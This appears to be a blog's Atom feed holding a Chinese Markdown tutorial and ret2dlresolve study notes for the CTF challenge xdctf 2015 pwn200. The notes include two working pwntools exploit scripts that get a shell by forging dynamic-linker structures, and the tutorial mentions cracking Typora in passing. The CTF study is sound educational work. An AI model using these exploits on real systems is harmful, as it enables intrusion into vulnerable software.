<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-06-12T15:00:27+08:00</updated><id>/feed.xml</id><title type="html">b14ckb0x’s space</title><subtitle>Hack everything</subtitle><entry><title type="html">[Others]Markdown快速上手教学</title><link href="/others/2026/06/11/markdown-quick-start.html" rel="alternate" type="text/html" title="[Others]Markdown快速上手教学" /><published>2026-06-11T00:00:00+08:00</published><updated>2026-06-11T00:00:00+08:00</updated><id>/others/2026/06/11/markdown-quick-start</id><content type="html" xml:base="/others/2026/06/11/markdown-quick-start.html"><![CDATA[<h1 id="markdown如何快速上手">Markdown如何快速上手</h1>

<p>先简单介绍一下markdown，这是一种轻量级标记语言，比起格式复杂的docx等，markdown可以直接用纯文本格式编写，简单，就是它最大的优势。标记语言的意思就是，只要你使用特定的标记，那么markdown就能对特定的标记的内容进行自动渲染，下面来快速学学常用的标记吧。</p>

<h2 id="号">#号</h2>

<p>#号是最先也是最容易掌握的，文本前加入#和空格，就表示标题，一共可以有一至六级标题，使用方法如下</p>

<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh"># 一级标题</span>
<span class="gu">## 二级标题</span>
<span class="gu">### 三级标题</span>
<span class="gu">#### 四级标题</span>
</code></pre></div></div>

<p>以Obsidian为例子，各级标题的效果是这样的，</p>

<p><img src="/assets/images/2026-06-11-markdown-quick-start/ref1.png" alt="ref1" /></p>

<p>同时在使用标题时，如果你的markdown笔记软件支持（应该都支持），那么你可以在软件侧边栏看到一个和word差不多的大纲。</p>

<h2 id="图片">图片</h2>

<p>图片应该是使用第二多的，和word不同，由于markdown是纯文本格式，所以里面没法粘贴图片，所以markdown只能引用外部的图片，其格式如下</p>

<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">![</span><span class="nv">ImageName</span><span class="p">](</span><span class="sx">/path/to/Image.png</span><span class="p">)</span>
<span class="p">![</span><span class="nv">ref1</span><span class="p">](</span><span class="sx">/assets/images/2026-06-11-markdown-quick-start/ref1.png</span><span class="p">)</span>
</code></pre></div></div>

<p>一旦你移动了图片，markdown里的图片路径就需要跟着改，否则就会找不到图片，无法显示了。此外，一般这个路径不需要自己写，粘贴剪切板的图片时，你的markdown编辑软件一般会帮你把图片保存到特定位置，然后自动填写路径，一般也可以靠设置或者插件来设定图片保存的位置。如果使用Obsidian，那么粘贴的图片格式会是非标准的markdown格式，![[ImagePath]]，这个有点烦人，会导致你换个软件打开markdown就无法显示图片，可以在Obsidian设置里下一个第三方插件解决这个问题。</p>

<h2 id="代码">代码</h2>

<p>对于技术爱好者而言，代码应该是和图片使用一样多的，markdown里也提供了专门的代码标签，在标签里贴代码会比在word里直接粘贴代码要美观很多，这也是广大技术爱好者都喜欢用markdown的原因之一吧，代码格式如下</p>

<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>这是一个c语言代码示例，用三个反引号来包裹代码，上方的反引号右边不加空格直接写语言的名称
<span class="p">```</span><span class="nl">c
</span><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="p">```</span>
python示例
<span class="p">```</span><span class="nl">python
</span><span class="k">print</span> <span class="sh">"</span><span class="s">hello world</span><span class="sh">"</span>
<span class="p">```</span>
一般来说上下各三个反引号就能包裹代码，不过比如这里我为了展示，
内层的三个反引号不能被markdown转义，因此我的外层实际使用了四个反引号，
见下图。如果你的代码块里也必须出现反引号，
那么包裹你的代码块使用的反引号数量，
就必须大于你内部出现的连续的反引号数量

</code></pre></div></div>

<p>这里是图，我用了四个反引号来包裹</p>

<p><img src="/assets/images/2026-06-11-markdown-quick-start/ref2.png" alt="ref2" /></p>

<h2 id="转义">转义</h2>

<p>和编程一样，为了防止文章中的特定符号被当成markdown解析，可以使用”\“反斜杠符号来防止转义。</p>

<h2 id="其它标签">其它标签</h2>

<p>掌握上面的四个markdown标签，就已经能写出很漂亮的wp或者什么其他技术类文章了，其他的特殊字符还有*星号，_下划线，-短横线等等，可以实现粗体斜体列表什么的；markdown也还可以实现简单的表格、引用、甚至内嵌html，可以用来更加丰富文章，就请自己研究了。</p>

<h2 id="推荐软件">推荐软件</h2>

<p>个人使用typora和obsidian，前者付费后者免费，不过obsidian会强制使用vault，就是你的md文件必须放在它的vault的位置才给你编辑，不给你随便打开一个任意位置的md文件，对新手可能会有点麻烦，而且也存在它自己定义的图片标签问题。Typora则比较通用，并且这软件早期是可以直接改它配置文件破解的，现在不知道还行不行。</p>

<h2 id="小注">小注</h2>

<p>由于markdown是纯文本格式，必须要markdown编辑器才能渲染出标签，并且图片也不能移动，因此分享markdown的时候，一般是导出为pdf，再发给别人，而不是直接png、md啥的都丟给别人噢</p>]]></content><author><name></name></author><category term="Others" /><summary type="html"><![CDATA[Markdown如何快速上手]]></summary></entry><entry><title type="html">[PWN]ret2dlresolve学习笔记（32位程序为例子）</title><link href="/pwn/2026/06/11/ret2dlresolve.html" rel="alternate" type="text/html" title="[PWN]ret2dlresolve学习笔记（32位程序为例子）" /><published>2026-06-11T00:00:00+08:00</published><updated>2026-06-11T00:00:00+08:00</updated><id>/pwn/2026/06/11/ret2dlresolve</id><content type="html" xml:base="/pwn/2026/06/11/ret2dlresolve.html"><![CDATA[<h1 id="ret2dlresolve">ret2dlresolve</h1>

<p>本次学习以32位为例子，linux的动态链接使用的是_dl_runtime_resolve(link_map_obj, reloc_offset)。先来看看相关原理。</p>

<h2 id="相关原理">相关原理</h2>
<p>（1）.dynamic的结构类似一个键值对数组，重定位表项、动态符号表、动态字符串表在其中的结构类似：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DT_SYMTAB 6 d_ptr //指向动态符号表
DT_STRTAB 5 d_ptr //指向动态字符串表
DT_REL 17 d_ptr  //重定位表，指向.rel.dyn
DT_RELA 7 d_ptr //重定位表，指向.rela.dyn
</code></pre></div></div>

<p>（2）ELF文件中，每个需要重定位的ELF节都有对应的重定位表，比如.text节如果需要重定位，那么就会对应.rel.text。在导入一个函数时，_dl_runtime_resolve会根据reloc_offset（32位叫reloc_arg，64位叫reloc_index）去.rel.plt中找偏移对应的值，然后去.dynsym找对应的符号名称，再在.dynstr中找对应的函数名字符串。</p>

<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref1.png" alt="ref1" /></p>

<p>（3）_dl_runtime_resolve是用汇编编写的，32位和64位也有不同之处。这个函数的代码功能简单来说就是保存寄存器，然后调用_dl_fixup执行具体绑定的过程，64位的话，除了更多寄存器和用寄存器传参而非栈传参，就是最后返回的区别了，32位函数的最后是ret，64位则是jmp</p>

<p>因此如果能修改_dl_runtime_resolve(link_map_obj, reloc_offset)的参数，就能使这个函数在解析的时候解析到我们想去的函数。具体的，我们需要修改.dynamic节，因为这个节包含重定位表项、动态符号表、动态字符串表。
不过.dynamic没这么好改，开了RELRO的情况下，重定位表项、动态符号表、动态字符串表都是只读的，比较可行的思路是伪造重定位偏移reloc_offset，但是“我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。”</p>

<p>来看看不同情况的具体题目吧</p>

<h2 id="norelro-32">NoRelro 32</h2>

<p>xdctf 2015 pwn200</p>

<p>源码</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">vuln</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>现在用gcc来编译32位版本</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-m32</span> <span class="nt">-z</span> norelro <span class="nt">-no-pie</span> pwn.c <span class="nt">-o</span> norelro32
</code></pre></div></div>

<p>其实从题目也可以看出来不难，直接正常打就行了，这里用ret2dlresolve的技巧来打。先讲讲这个编译，可以看出来关闭了栈保护，关闭了relro（即关闭了GOT/PLT等的只读），关闭了pie，payload如下</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">new-window</span><span class="sh">"</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">i386</span><span class="sh">"</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./norelro32</span><span class="sh">"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="sh">"</span><span class="s">./norelro32</span><span class="sh">"</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./norelro32</span><span class="sh">"</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="sh">'</span><span class="s">b main</span><span class="sh">'</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="n">offset</span><span class="o">*</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x0804b184</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># modify .dynstr pointer in .dynamic section to a specific location
</span><span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">get_section_by_name</span><span class="p">(</span><span class="sh">'</span><span class="s">.dynstr</span><span class="sh">'</span><span class="p">).</span><span class="nf">data</span><span class="p">()</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">dynstr</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x0804b260</span><span class="p">,</span><span class="nf">len</span><span class="p">((</span><span class="n">dynstr</span><span class="p">)))</span> <span class="c1"># construct a fake dynstr section in bss
</span><span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x0804b260</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span> <span class="c1"># read /bin/sh\x00
</span><span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="mh">0x08049056</span><span class="p">)</span> <span class="c1"># the second instruction of read@plt 
</span><span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="mh">0x0804b260</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
<span class="nf">assert</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">())</span><span class="o">&lt;=</span><span class="mi">256</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">256</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">())))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">dump</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804b260</span><span class="p">))</span> <span class="c1"># hijack .dynstr to bss
</span><span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">dynstr</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>下面来解析一下，首先因为关闭了RELRO，所以got、plt啥的就可以写了，当然了.dynamic节也会可写了，所以就通过写.dynamic节，把read替换成system，这样调用_dl_runtime_resolve的时候，就会把read函数解析成system，然后就能getshell了，payload的执行过程如下</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.第一个read是程序原本的read，触发栈溢出，返回到我们rop的第一个read函数，往0x0804b184+4<span class="o">(</span>即.dynamic节的DT_STRTAB的d_val<span class="o">)</span>读取4字节，读入的内容是0x0804b260，这是一个bss的地址，也就是把.dynstr的位置劫持到我们可写的bss段
2.利用pwntools获取到原来.dynstr的完整内容，然后把里面的read替换成system，再利用rop链里的第二个read，把修改后的.dynstr读入到bss段
3.第三个read，往bss上读入/bin/sh
4.此时栈上的布局是0x08049056（下一个返回的地址），0xdeadbeef（下下个返回地址），函数参数。0x08049056就是read@plt的第二条指令，函数参数已被构造为system的参数，而此时.dynstr已被劫持，只要再次触发read的_dl_runtime_resolve就能解析到system执行
</code></pre></div></div>

<p>如图，这是.dynamic在IDA中的表现形式</p>

<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref2.png" alt="ref2" /></p>

<p>为什么要劫持到read@plt的第二条指令呢，因为read先前已经执行并解析过了，如果劫持到第一条jmp，那么会直接跳到真实地址，而不是触发解析，下图是read@plt，可以看到第一条jmp，第二条push，第三条jmp。</p>

<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref3.png" alt="ref3" /></p>

<p>顺便说说pwntools的这个rop对象，这个就相当于把平时p64自动打包好了，不用自己手写完整的链条了。</p>

<h2 id="partialrelro-32">PartialRelro 32</h2>

<p>开了部分relro后，.dynamic就不可写了，需要自己伪造重定位表项。这里先简单说说大概怎么个伪造方法，其实和堆里面伪造一个fake chunk的原理差不多，在内存中找一个空的位置，根据重定位表的结构，伪造相关的数据，再让_dl_runtime_resolve的reloc_offset参数指向我们伪造的那片内存的重定位项就可以了。pwntools里有自动构造dlresolve的payload的工具了，这里就来讲讲这个工具的使用的方式，和其构造的payload具体是怎么样的吧</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">new-window</span><span class="sh">"</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">i386</span><span class="sh">"</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./partialrelro32</span><span class="sh">"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="sh">"</span><span class="s">./partialrelro32</span><span class="sh">"</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./partialrelro32</span><span class="sh">"</span><span class="p">)</span>
<span class="n">dlresolve</span> <span class="o">=</span> <span class="nc">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span><span class="n">symbol</span><span class="o">=</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dlresolve</span><span class="p">.</span><span class="n">data_addr</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="nf">ret2dlresolve</span><span class="p">(</span><span class="n">dlresolve</span><span class="p">)</span>
<span class="n">raw_rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span><span class="mi">112</span><span class="p">:</span><span class="n">raw_rop</span><span class="p">,</span> <span class="mi">256</span><span class="p">:</span><span class="n">dlresolve</span><span class="p">.</span><span class="n">payload</span><span class="p">})</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Ret2dlresolvePayload接收三个参数，一个是程序的elf对象，第二个参数是希望动态解析的目标函数字符串，这里是symbol=”system”，第三个参数是第二个目标函数的参数，。这个函数构造好dlresolve对象后，调用dlresolve.data_addr计算可写的地址，就是计算可以把伪造的重定向表放在哪里，再调用rop.ret2dlresolve(dlresolve)，使程序在rop链的最后返回到_dl_runtime_resolve执行解析。dlresolve.payload则是包含了完整的伪造重定向表。写成p32的形式，两个payload（忽略掉填充）分别是这样，raw_rop：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop_chain</span> <span class="o">=</span> <span class="p">(</span>
    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08049050</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># read@plt
</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804901b</span><span class="p">)</span> <span class="o">+</span>      <span class="c1">#  add esp, pop ebx, ret
</span>
    <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>
    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804ce00</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># 程序中一个可读写的地址，可以去gdb里用vmmap来确认
</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x65616161</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># read的长度参数，这里直接被padding顶替了
</span>
    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08049020</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># plt0
</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x4a9c</span><span class="p">)</span> <span class="o">+</span>          <span class="c1"># reloc_arg
</span>
    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x68616161</span><span class="p">)</span> <span class="o">+</span>      <span class="c1">#这个也是padding，这个位置无作用，因为system执行完也不会返回
</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804ce24</span><span class="p">)</span>        <span class="c1"># "/bin/sh"地址
</span><span class="p">)</span>
</code></pre></div></div>

<p>开始分析前先讲讲plt0这个东西，它的汇编代码是这样的</p>

<pre><code class="language-assembly">.plt:08049020 sub_8049020     proc near               ; CODE XREF: .plt:0804903B↓j
.plt:08049020                                         ; .plt:0804904B↓j ...
.plt:08049020 ; __unwind {
.plt:08049020                 push    ds:dword_804B23C ; reloc_arg
.plt:08049026                 jmp     ds:dword_804B240 ; _dl_runtime_resolve
.plt:08049026 sub_8049020     endp
.plt:08049026
</code></pre>

<p>和NoRelro中讲到的jmp-&gt;push-&gt;jmp解析还不太一样，当跳转到这里的push执行的时候，_dl_runtime_resolve并没有明确要解析什么函数，而是直接通过栈或者寄存器来传递reloc_arg参数，也就是说它要怎么解析全看栈或者寄存器上的数据，所以一般pwn都会利用这个来解析，这样无论程序的GOT里有没有对应函数，只要我们伪造了reloc_arg，就可以直接解析。</p>

<p>这样第一段payload的总体流程就很好懂了，先利用溢出漏洞，跳转到rop里的read，通过这个read我们可以往指定的地方写入数据，写的内容则是伪造的重定位表，写完之后进行栈的修正（esp与ebp），然后就跳转到plt0，这时候由于在栈上伪造好了reloc_arg，所以就直接去解析内存中被伪造的重定位表执行system(‘/bin/sh’)。</p>

<p>然后是dlresolve.payload部分，在这一部分我们会看到重定位表是怎么伪造的：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dlresolve_payload</span> <span class="o">=</span> <span class="p">(</span>
    <span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="se">\x00</span><span class="sh">"</span>
    <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">acaaa</span><span class="sh">"</span>

    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x4b54</span><span class="p">)</span>
    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804ce00</span><span class="p">)</span>
    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x04c007</span><span class="p">)</span>

    <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span>
<span class="p">)</span>
</code></pre></div></div>

<p>可以看看本文的第一副图片，现在要伪造的是.dynsym中的一个Elf32_Sym，其结构如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">Elf32_Word</span> <span class="n">st_name</span><span class="p">;</span>      <span class="c1">// 符号名在字符串表中的偏移, 4 bytes</span>
    <span class="n">Elf32_Addr</span> <span class="n">st_value</span><span class="p">;</span>     <span class="c1">// 符号地址 , 4 bytes</span>
    <span class="n">Elf32_Word</span> <span class="n">st_size</span><span class="p">;</span>      <span class="c1">// 大小, 4 bytes</span>
 
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="c1">// 1 bytes</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> <span class="c1">// 1 bytes</span>
    <span class="n">Elf32_Half</span> <span class="n">st_shndx</span><span class="p">;</span>  <span class="c1">// 2 bytes</span>
<span class="p">}</span> <span class="n">Elf32_Sym</span><span class="p">;</span>
</code></pre></div></div>

<p>其中st_name不是符号的字符串，也不是地址，而是符号在.dynstr中的偏移，而我们的dlresolve.payload，是这样去设置这些值的：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Elf32_Sym</span> <span class="n">fake_sym</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">st_name</span>  <span class="o">=</span> <span class="mh">0x4b54</span><span class="p">,</span>
    <span class="p">.</span><span class="n">st_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">.</span><span class="n">st_size</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>

    <span class="p">.</span><span class="n">st_info</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">.</span><span class="n">st_other</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">.</span><span class="n">st_shndx</span> <span class="o">=</span> <span class="mi">0</span>
<span class="p">};</span>
</code></pre></div></div>

<p>dlresolve.payload把这个伪造的Elf32_Sym放在了0x804ce0c，开启debug模式就可以看到；而dlresolve.payload开头的“system”字符串则被read写入到了0x0804ce00，终端使用readelf可以看到.dynstr的地址正是0x80482ac，而加上0x4b54，就正好是0x0804ce00。</p>

<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref4.png" alt="ref4" /></p>

<p>不过还没完，dlresolve.payload的后段，p32(0x0804ce00) + p32(0x04c007)，还伪造了另一个东西，就是本文第一张图片里的Elf32_Rel，具体是这样伪造的：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Elf32_Rel</span> <span class="n">fake_rel</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">r_offset</span> <span class="o">=</span> <span class="mh">0x804ce00</span><span class="p">,</span>
    <span class="p">.</span><span class="n">r_info</span>   <span class="o">=</span> <span class="mh">0x04c007</span>
<span class="p">};</span>
</code></pre></div></div>

<p>其中，r_info就是用来找到对应的Elf32_Sym，在x86里，它分为高24位和低8位，其中，低8位固定为7，不然链接器就不处理，高24位则用于索引对应的Elf32_Sym，这里高24位是0x0004c，那么就是去.dynsym（Symtab）的地址0x0804820c的第0x4c0条地方（注意这个0x4c0不是偏移量，而是说在表的第几个项目，算偏移量还需要乘上size，这里size是16）: 0x0804820c + 0x4c0 * F = 0x0804820c + 0x4c00 = 0x0804ce0c ，也就是之前放伪造的Elf32_Sym的地方。</p>

<p>最后该把两串payload连起来看的，看看_dl_runtime_resolve是怎么找到伪造的Elf32_Rel的，其实很简单，我们触发plt0时，栈上的reloc_arg是0x4a9c，这个偏移值是和.rel.plt的0x08048380相加的（参考上一副图里的值吧），加起来就是0x0804ce1c，从read进去的偏移来算，刚好就是伪造的Elf32_Rel的地方，到这里PartialRelro 32的利用就算结束了。</p>

<h2 id="full-relro-32">Full RELRO 32</h2>

<p>这个模式下，REL相关的东西完全不可写了，程序开始执行前就会把函数地址解析完毕，_dl_runtime_resolve也不使用了，不过应该还是存在绕过方法的，毕竟_dl_runtime_resolve只是不用了，又不是删了，我查的资料中，似乎存在full relro下手动调用_dl_runtime_resolve，手动构造重定位表的方法，某种特定的情况下也许确实能用，等做题多一点应该就知道了。</p>

<h2 id="64位">64位</h2>

<p>64位的总体利用思路是和32差不多吧，这里只记录一下不同点，具体的题目做的时候再看吧（延迟绑定这一块）。</p>

<p>首先是ELF_Rela变了，Rel后面多的a，表示多了一个addend,下面是它的结构体</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span> 
	<span class="n">Elf64_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span> <span class="mi">8</span> <span class="n">bytes</span>
	<span class="n">Elf64_Xword</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span> <span class="mi">8</span> <span class="n">bytes</span>
	<span class="n">Elf64_Sxword</span> <span class="n">r_addend</span><span class="p">;</span> <span class="cm">/* Addend */</span> <span class="mi">8</span> <span class="n">bytes</span>
<span class="p">}</span> <span class="n">Elf64_Rela</span><span class="p">;</span> 
<span class="cm">/* How to extract and insert information held in the r_info field. */</span> 
